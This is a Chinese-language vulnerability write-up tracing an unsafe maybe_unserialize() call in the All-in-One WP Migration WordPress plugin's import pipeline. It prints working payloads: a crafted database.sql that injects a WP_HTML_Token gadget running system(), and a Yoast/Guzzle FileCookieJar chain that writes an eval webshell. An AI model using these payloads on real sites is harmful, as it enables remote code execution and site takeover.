---
title: All-in-One WP Migration v7.105 — 反序列化漏洞分析
tags: 
  - 漏洞分析
  - 反序列化
  - php
  - wordpress
categories: 漏洞分析
---

# All-in-One WP Migration v7.105 — 反序列化漏洞分析

## 插件简介

All-in-One WP Migration 是 WordPress 生态系统中最受欢迎的迁移插件之一，由 ServMask 公司开发。自2013年发布以来，它已经帮助全球数百万用户轻松迁移他们的 WordPress 网站。

![All-in-One WP Migration 插件界面](/img/image-20260604174350742.png)

后记：犯了一个很愚蠢的错误，我忘了这个功能本身是能上传php代码的，也就是说如果能上传恶意wpress，就能上传"善意webshell"。感觉对功能预期的情况进行仔细核查是非常重要且必要的，目前看来也是通过关键函数进行代码审计里很容易出问题的部分。

## 漏洞分析

漏洞点在导入流程中 `class-ai1wm-import-options.php`对数据库查询结果调用 `maybe_unserialize()` 时未限制 `allowed_classes`，导致攻击者可通过备份文件中的序列化 payload 触发 `WP_HTML_Token` gadget 链实现 RCE。

### 导入管道注册

**文件**: `lib/controller/class-ai1wm-main-controller.php:160-177`

```php
add_filter( 'ai1wm_import', 'Ai1wm_Import_Upload::execute', 5 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Compatibility::execute', 10 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Validate::execute', 50 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Validate_Crc::execute', 55 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Blogs::execute', 150 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Database_File::execute', 295 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Database::execute', 300 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Options::execute', 330 );
add_filter( 'ai1wm_import', 'Ai1wm_Import_Clean::execute', 400 );
```

数字是 priority，按从小到大依次执行。**漏洞触发在 priority=330 的 `Import_Options`**。

### 控制器分发逻辑

**文件**: `lib/controller/class-ai1wm-import-controller.php:38-159`

```php
public static function import( $params = array() ) {
    $params = stripslashes_deep( array_merge( $_GET, $_POST ) );  // 合并请求参数
    $secret_key = trim( $params['secret_key'] );
    ai1wm_verify_secret_key( $secret_key );  // Line 64: 唯一鉴权，不匹配则 exit

    // 按 priority 执行对应 hook
    if ( ( $filters = ai1wm_get_filters( 'ai1wm_import' ) ) ) {
        while ( $hooks = current( $filters ) ) {
            if ( intval( $params['priority'] ) === key( $filters ) ) {
                $params = call_user_func_array( $hook['function'], array( $params ) );  // Line 77
            }
        }
    }
}
```

### Step 5 (priority=5)：上传恶意备份

**文件**: `lib/model/import/class-ai1wm-import-upload.php:34-201`

```php
// Line 37-38: 接收上传文件
if ( isset( $_FILES['upload_file']['tmp_name'] ) ) {
    $upload_tmp_name = $_FILES['upload_file']['tmp_name'];
}

// Line 71: 校验 1 — 文件扩展名必须是 .wpress
if ( ! ai1wm_is_filename_supported( ai1wm_archive_path( $params ) ) ) {
    throw new Ai1wm_Upload_Exception( ... );
}

// Line 86: 校验 2 — 文件头必须是 package.json
if ( ! ai1wm_is_filedata_supported( $upload_tmp_name ) ) {
    throw new Ai1wm_Upload_Exception( ... );
}

// Line 104: 校验通过，复制文件到 storage 目录
ai1wm_copy( $upload_tmp_name, ai1wm_archive_path( $params ) );
```

**`ai1wm_is_filedata_supported()`** (functions.php:1903-1917)：

```php
function ai1wm_is_filedata_supported( $file ) {
    $file_handle = fopen( $file, 'rb' );
    $file_buffer = fread( $file_handle, Ai1wm_Archiver::HEADER_SIZE );  // 读前 4377 字节
    $file_data = unpack( 'a255filename/a14size/a12mtime/a4088path/a8crc32', $file_buffer );
    if ( AI1WM_PACKAGE_NAME === trim( $file_data['filename'] ) ) {  // 只检查第一个 entry 名是 package.json
        return true;
    }
    return false;
}
```

**文件格式**（.wpress 二进制结构）：

```
[Entry 1 Header (4377B)] [package.json 内容 (363B)]
[Entry 2 Header (4377B)] [database.sql 内容 (481B)]
[EOF Block (4377B)]
```

### Step 10 (priority=10)：兼容性检查

**文件**: `lib/model/import/class-ai1wm-import-compatibility.php:34-50`

```php
public static function execute( $params ) {
    do_action( 'ai1wm_status_import_start', $params );
    $messages = Ai1wm_Compatibility::get( $params );
    if ( empty( $messages ) ) {
        return $params;  // 无兼容性问题，直接返回
    }
    throw new Ai1wm_Compatibility_Exception( ... );
}
```

**作用**：检查 PHP 版本、扩展等，无文件操作，不影响后续流程。

### Step 50 (priority=50)：校验归档 + 解压 package.json

**文件**: `lib/model/import/class-ai1wm-import-validate.php:34-107`

```php
public static function execute( $params ) {
    // Line 37: 校验文件大小（32 位 PHP 限制 < 2GB）
    if ( ! ai1wm_is_filesize_supported( ai1wm_archive_path( $params ) ) ) { ... }

    // Line 51: 校验扩展名 .wpress
    if ( ! ai1wm_is_filename_supported( ai1wm_archive_path( $params ) ) ) { ... }

    // Line 68: 打开归档文件
    $archive = new Ai1wm_Extractor( ai1wm_archive_path( $params ) );

    // Line 71: 校验 EOF 块
    if ( ! $archive->is_valid() ) {
        throw new Ai1wm_Import_Exception( ... );
    }

    // Line 81: 解压 package.json 和 multisite.json 到 storage 目录
    $archive->extract_by_files_array(
        ai1wm_storage_path( $params ),
        array( AI1WM_PACKAGE_NAME, AI1WM_MULTISITE_NAME )
    );

    // Line 84: 检查 package.json 是否存在
    if ( false === is_file( ai1wm_package_path( $params ) ) ) {
        throw new Ai1wm_Import_Exception( ... );
    }

    // Line 98-101: 记录 CRC 值（供后续校验）
    $params['archive_crc_value'] = $archive->get_archive_crc_value();
    $params['archive_crc_size'] = $archive->get_archive_crc_size();
    $archive->close();
    return $params;
}
```

**作用**：验证归档完整性（EOF 块），解压配置文件供后续步骤使用。通过后 `storage/` 目录下会有 `package.json`。

### Step 150 (priority=150)：创建 blogs.json

**文件**: `lib/model/import/class-ai1wm-import-blogs.php:34-155`

```php
public static function execute( $params ) {
    $blogs = array();

    // Line 42: 如果有 multisite.json（多站点备份），读取站点配置
    if ( true === is_file( ai1wm_multisite_path( $params ) ) ) {
        // ... 解析多站点配置
    }

    // Line 147-148: 创建 blogs.json（空数组或包含站点信息）
    $handle = ai1wm_open( ai1wm_blogs_path( $params ), 'w' );
    ai1wm_write( $handle, json_encode( $blogs ) );
    ai1wm_close( $handle );
    return $params;
}
```

**作用**：为 Step 300（SQL 导入）创建必要的 `blogs.json` 配置文件。单站点时为空数组 `[]`。

### Step 295 (priority=295)：解压 database.sql

**文件**: `lib/model/import/class-ai1wm-import-database-file.php:34-164`

```php
public static function execute( $params ) {
    // Line 71: 读取 package.json 获取配置（压缩类型等）
    $handle = ai1wm_open( ai1wm_package_path( $params ), 'r' );
    $config = json_decode( ai1wm_read( $handle, filesize( ... ) ), true );

    // Line 94: 打开归档文件
    $archive = new Ai1wm_Extractor( ai1wm_archive_path( $params ), ... );

    // Line 106: 解压 database.sql 到 storage 目录
    $archive->extract_by_files_array(
        ai1wm_storage_path( $params ),
        array( AI1WM_DATABASE_NAME ),  // 只解压 database.sql
        ...
    );
    $archive->close();
    return $params;
}
```

**作用**：从归档中提取 `database.sql` 到 `storage/{storage}/database.sql`。

### Step 300 (priority=300)：执行恶意 SQL

**文件**: `lib/model/import/class-ai1wm-import-database.php:34-1093`

```php
public static function execute( $params ) {
    // Line 38: 检查 database.sql 是否存在
    if ( ! is_file( ai1wm_database_path( $params ) ) ) {
        return $params;
    }

    // Line 57: 读取 blogs.json
    $handle = ai1wm_open( ai1wm_blogs_path( $params ), 'r' );
    $blogs = json_decode( ai1wm_read( $handle, filesize( ... ) ), true );

    // Line 67: 读取 package.json
    $handle = ai1wm_open( ai1wm_package_path( $params ), 'r' );
    $config = json_decode( ai1wm_read( $handle, filesize( ... ) ), true );

    // Line 980-989: 设置表前缀替换规则（SERVMASK_PREFIX_ → 实际前缀）
    $db_client->set_old_table_prefixes( $old_table_prefixes )
        ->set_new_table_prefixes( $new_table_prefixes );

    // Line 1013: 执行 SQL 导入（逐行读取并执行）
    $db_client->import( ai1wm_database_path( $params ), $query_offset );
```

`$db_client->import()` 的实际执行（class-ai1wm-database.php:1083-1156）：

```php
while ( ( $line = fgets( $file_handler ) ) !== false ) {
    $query .= $line;
    if ( preg_match( '/;\s*$/S', $query ) ) {  // 检测语句结尾的分号
        $query = trim( $query );
        $query = $this->replace_table_prefixes( $query );  // 替换表前缀
        if ( $this->should_ignore_query( $query ) === false ) {
            $this->query( $query );  // Line 1156: 执行攻击者控制的 SQL
        }
    }
}
```

**恶意database.sql**：

```sql
DROP TABLE IF EXISTS wp_mainsite_sitemeta;
CREATE TABLE wp_mainsite_sitemeta ( ... );
INSERT INTO wp_mainsite_sitemeta (meta_key, meta_value) VALUES
('fs_accounts', 'O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:6:"whoami";s:10:"on_destroy";s:6:"system";}');
```

**关键**：SQL 没有任何过滤，攻击者的 `CREATE TABLE` + `INSERT` 被完整执行。恶意序列化对象被写入 `meta_value` 列。

### Step 330 (priority=330)：漏洞触发点

**文件**: `lib/model/import/class-ai1wm-import-options.php:34-78`

```php
public static function execute( $params ) {
    $db_client = Ai1wm_Database_Utility::get_client();
    $tables = $db_client->get_tables();
    $mainsite_prefix = ai1wm_table_prefix( 'mainsite' );  // Line 47: 返回 base_prefix + 'mainsite_'

    // Line 50: 检查表是否存在（Step 300 创建）
    if ( in_array( "{$mainsite_prefix}sitemeta", $tables ) ) {

        // Line 53: 查询攻击者控制的 meta_value
        $result = $db_client->query(
            "SELECT meta_value FROM `{$mainsite_prefix}sitemeta` WHERE meta_key = 'fs_accounts'"
        );

        if ( ( $row = $db_client->fetch_assoc( $result ) ) ) {
            $fs_accounts = get_option( 'fs_accounts', array() );

            // 无 allowed_classes 限制的反序列化
            $meta_value = maybe_unserialize( $row['meta_value'] );

            // Line 59: PHP 8.2+ TypeError → 触发 scope exit → __destruct()
            if ( ( $fs_accounts = array_merge( $fs_accounts, $meta_value ) ) ) { ... }
        }
    }
}
```

这里有个很奇怪的地方，可以从上面的函数看到`$blog_id`被硬编码为了`mainsite`，过这个函数的时候恒不等于`null/0/1`，因此最后的表名前缀一定为`base_prefix(默认是wp)_+mainsite+_`

```php
function ai1wm_table_prefix( $blog_id = null ) {
    if ( ai1wm_is_mainsite( $blog_id ) ) {  // 'mainsite' !== null/0/1 → false
        return $wpdb->base_prefix;
    }
    return $wpdb->base_prefix . $blog_id . '_';  // → 'wp_mainsite_
}
```

### 漏洞流程总结

```
可控数据流：
  .wpress 备份 → database.sql → SQL INSERT → wp_mainsite_sitemeta.meta_value
                                                              ↓
                                                     maybe_unserialize()
                                                              ↓
                                                    WP_HTML_Token 对象
                                                              ↓
                                                    PHP 8.2+: array_merge() TypeError
                                                              ↓
                                                    __destruct() → call_user_func('system', 'whoami')
                                                              ↓
                                                         RCE
```

### 可用 Gadget 链

| Gadget | WordPress 版本 | 方法 |
|--------|--------------|------|
| `WP_HTML_Token::__destruct` | 6.4.0 ~ 6.4.1 | `call_user_func($this->on_destroy, $this->bookmark_name)` |

**`WP_HTML_Token`** (wp-includes/html-api/class-wp-html-token.php:92-94)：

```php
public function __destruct() {
    if ( is_callable( $this->on_destroy ) ) {
        call_user_func( $this->on_destroy, $this->bookmark_name );
    }
}
```
附两张调试结果的截图：

![调试结果截图1](/img/image-20260605152425875.png)

![调试结果截图2](/img/image-20260605152456969.png)

### wpress 文件格式

```
Offset  Size    Field
0       255     filename (null-padded)
255     14      filesize (null-padded)
269     12      mtime (null-padded)
281     4088    path (null-padded, '.' for root)
4369    8       crc32 (hex string)
--- Header total: 4377 bytes ---
4377    N       file content (raw bytes)

... repeat for each file ...

[EOF Block: 4377 bytes of null + archive_size + archive_crc]
```



## yoast-GuzzleHttp-gadget

后来我提交的漏洞被拒了，其中的一个理由就是wordpress6.4.1版本过老，要能在wordpress7.0上进行代码执行。经过审计，发现另一个高热插件`yoast-seo`存在`gadget`，该`gadget`是PHPGGC中已知的。

```php
// PHPGGC: gadgetchains/Guzzle/FW/1/chain.php
class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0-rc.2 <= 7.5.0+';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];
        return new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
    }
}
```

漏洞代码：

```php
// FileCookieJar.php:40-43
public function __destruct()
{
    $this->save($this->filename);  // $filename 可控
}

// FileCookieJar.php:51-64
public function save(string $filename) : void
{
    $json = [];
    foreach ($this as $cookie) {
        if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
            $json[] = $cookie->toArray();  // $cookie->data['Value'] 可控
        }
    }
    $jsonStr = Utils::jsonEncode($json);
    file_put_contents($filename, $jsonStr, LOCK_EX);  // 写入任意文件
}

// CookieJar.php:58-66
public static function shouldPersist(SetCookie $cookie, bool $allowSessionCookies = false) : bool
{
    if ($cookie->getExpires() || $allowSessionCookies) {  // Expires=1 → true
        if (!$cookie->getDiscard()) {                      // Discard=0 → true
            return true;
        }
    }
    return false;
}
```

`payload`构造：

```php
O:49:"YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar":4:{
    s:55:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar\0filename";
        s:xx:"<shell_path>";           // 写入路径
    s:63:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar\0storeSessionCookies";
        b:1;                           // 允许持久化
    s:52:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\CookieJar\0cookies";
        a:1:{i:0;O:46:"YoastSEO_Vendor\GuzzleHttp\Cookie\SetCookie":1:{
            s:53:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\SetCookie\0data";
                a:3:{
                    s:7:"Expires";i:1;   // shouldPersist=true
                    s:7:"Discard";b:0;   // 不丢弃
                    s:5:"Value";s:xx:"<?php eval($_POST['ant']); ?>";  // shell 代码
                }
        };}
    s:51:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\CookieJar\0strictMode";
        b:0;                           // 不抛异常
}
```

执行脚本

```powershell
.\exploit_fullauto_yoast.ps1 -Target "http://localhost/wordpress7" -User admin -Pass 123456
```

![image-20260611172223230](/img/image-20260611172223230.png)

![image-20260611172246808](/img/image-20260611172246808.png)

大概算是，成功了，又没完全成功。

以上。
